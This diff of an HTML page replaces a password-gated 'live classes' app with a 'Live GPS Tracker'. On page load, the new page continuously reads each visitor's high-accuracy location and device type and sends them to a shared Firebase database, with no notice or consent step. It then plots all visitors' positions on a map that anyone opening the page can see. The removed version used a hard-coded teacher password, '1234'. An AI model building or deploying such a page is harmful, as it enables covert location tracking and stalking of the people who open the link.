@@ -3,52 +3,16 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>INDEVERYDAY Live Classes</title>
+<title>Live GPS Tracker</title>
 <style>
-body{font-family:Arial; background:#f5f7fa; display:flex; flex-direction:column; align-items:center; padding:20px;}
-h1{color:#007bff;}
-button{padding:12px 25px; margin:10px; border:none; border-radius:20px; background:#007bff; color:white; cursor:pointer; font-size:16px;}
-button:hover{opacity:0.9;}
-#teacherPanel, #studentJoin, #studentPanel, #teacherLogin{display:none; width:90%; max-width:800px;}
-#studentList{margin-top:10px;}
-#map{width:100%;height:400px;margin-top:15px;border-radius:15px;}
+  body{font-family:Arial; display:flex; flex-direction:column; align-items:center; margin:0; padding:0;}
+  h2{margin:20px 0;}
+  #map{width:100%; max-width:800px; height:500px; margin-bottom:20px; border-radius:15px;}
 </style>
 </head>
 <body>
-<h1>INDEVERYDAY Live Classes</h1>
-
-<div id="mainButtons">
-  <button onclick="showStudentJoin()">Join as Student</button>
-  <button onclick="showTeacherLogin()">Login as Teacher</button>
-</div>
-
-<!-- Teacher Login -->
-<div id="teacherLogin">
-  <input type="password" id="teacherPass" placeholder="Enter Password" style="padding:10px; font-size:16px;">
-  <button onclick="teacherLogin()">Login</button>
-</div>
-
-<!-- Teacher Panel -->
-<div id="teacherPanel">
-  <h2>Teacher Panel</h2>
-  <p>Session ID: <span id="sessionIdText"></span></p>
-  <p>Share this link with students: <span id="sessionLink"></span></p>
-  <h3>Students Joined:</h3>
-  <ul id="studentList"></ul>
-  <div id="map"></div>
-</div>
-
-<!-- Student Join -->
-<div id="studentJoin">
-  <input type="text" id="studentName" placeholder="Enter Your Name">
-  <button onclick="joinSession()">Join Session</button>
-</div>
-
-<!-- Student Panel -->
-<div id="studentPanel">
-  <h2>Joined Live Class</h2>
-  <p>Waiting for teacher...</p>
-</div>
+<h2>Live GPS Tracker</h2>
+<div id="map"></div>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
@@ -69,98 +33,64 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// Show panels
-function showTeacherLogin(){document.getElementById('mainButtons').style.display='none'; document.getElementById('teacherLogin').style.display='block';}
-function showStudentJoin(){document.getElementById('mainButtons').style.display='none'; document.getElementById('studentJoin').style.display='block';}
+// Unique visitor ID
+const visitorId = 'visitor_' + Math.floor(Math.random()*1000000);
 
-// Teacher Login
-let sessionId = '';
-function teacherLogin(){
-  const pass = document.getElementById('teacherPass').value;
-  if(pass==='1234'){
-    document.getElementById('teacherLogin').style.display='none';
-    document.getElementById('teacherPanel').style.display='block';
-    sessionId = 'session_' + Math.floor(Math.random()*1000000);
-    document.getElementById('sessionIdText').textContent = sessionId;
-    document.getElementById('sessionLink').textContent = `${window.location.href}?session=${sessionId}`;
-    initMap();
-    listenStudents();
-  } else alert('Incorrect Password');
+// Device info
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    if(/android/i.test(ua)) return "Android";
+    else if(/iPad|iPhone|iPod/.test(ua)) return "iOS";
+    else if(/Windows/.test(ua)) return "Windows PC";
+    else if(/Macintosh/.test(ua)) return "Mac";
+    return "Unknown";
 }
 
-// Map initialization
+// Send GPS to Firebase
+function sendLocation() {
+    if(navigator.geolocation){
+        navigator.geolocation.watchPosition(pos=>{
+            const {latitude, longitude} = pos.coords;
+            db.ref(`visitors/${visitorId}`).set({
+                device: getDeviceInfo(),
+                latitude,
+                longitude,
+                timestamp: new Date().toISOString()
+            });
+        }, err=>console.error("GPS error:", err), {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
+    } else {
+        console.error("Geolocation not supported");
+    }
+}
+
+// Initialize Google Map
 let map;
 const markers = {};
-function initMap(){
+function initMap() {
     map = new google.maps.Map(document.getElementById('map'), {
-        center: {lat:20.5937, lng:78.9629}, zoom:5
+        center: {lat:20.5937, lng:78.9629}, // India default center
+        zoom:5
     });
-}
 
-// Listen for student updates
-function listenStudents(){
-    const ref = db.ref(`sessions/${sessionId}/students`);
+    const ref = db.ref('visitors');
     ref.on('value', snapshot=>{
-        const students = snapshot.val();
-        document.getElementById('studentList').innerHTML = '';
-        for(let id in students){
-            const s = students[id];
-            // List
-            const li = document.createElement('li');
-            li.textContent = `${s.name} - ${s.device} - Battery: ${s.battery?.level || '?'}% ${s.battery?.charging?'⚡':'❌'}`;
-            document.getElementById('studentList').appendChild(li);
-            // Map
-            if(s.gps){
-                const pos = {lat:s.gps.latitude, lng:s.gps.longitude};
-                if(markers[id]) markers[id].setPosition(pos);
-                else markers[id] = new google.maps.Marker({position:pos, map:map, title:s.name});
-            }
+        const visitors = snapshot.val();
+        for(let id in visitors){
+            const v = visitors[id];
+            const pos = {lat:v.latitude, lng:v.longitude};
+            if(markers[id]) markers[id].setPosition(pos);
+            else markers[id] = new google.maps.Marker({
+                position: pos,
+                map: map,
+                title: `${v.device} | ${v.timestamp}`
+            });
         }
     });
 }
 
-// Student join
-async function joinSession(){
-    const name = document.getElementById('studentName').value.trim();
-    if(!name){ alert('Enter your name'); return; }
-    document.getElementById('studentJoin').style.display='none';
-    document.getElementById('studentPanel').style.display='block';
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const sid = urlParams.get('session');
-    if(!sid){alert('Invalid session'); return;}
-    const studentId = 'student_' + Math.floor(Math.random()*1000000);
-
-    // Device
-    const ua = navigator.userAgent;
-    let device = "Unknown";
-    if(/android/i.test(ua)) device = "Android";
-    else if(/iPad|iPhone|iPod/.test(ua)) device = "iOS";
-    else if(/Windows/.test(ua)) device = "Windows PC";
-    else if(/Macintosh/.test(ua)) device = "Mac";
-
-    // Battery
-    let batteryInfo = {charging:'Unknown', level:'Unknown'};
-    if(navigator.getBattery){
-        const battery = await navigator.getBattery();
-        batteryInfo = {charging:battery.charging, level:battery.level*100};
-    }
-
-    // Push initial data
-    db.ref(`sessions/${sid}/students/${studentId}`).set({
-        name, device, battery: batteryInfo, timestamp: new Date().toISOString()
-    });
-
-    // Live GPS
-    if(navigator.geolocation){
-        navigator.geolocation.watchPosition(pos=>{
-            const {latitude, longitude} = pos.coords;
-            db.ref(`sessions/${sid}/students/${studentId}/gps`).set({
-                latitude, longitude, timestamp: new Date().toISOString()
-            });
-        }, err=>console.error(err), {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
-    }
-}
+// Start GPS and Map
+sendLocation();
+initMap();
 </script>
 </body>
 </html>
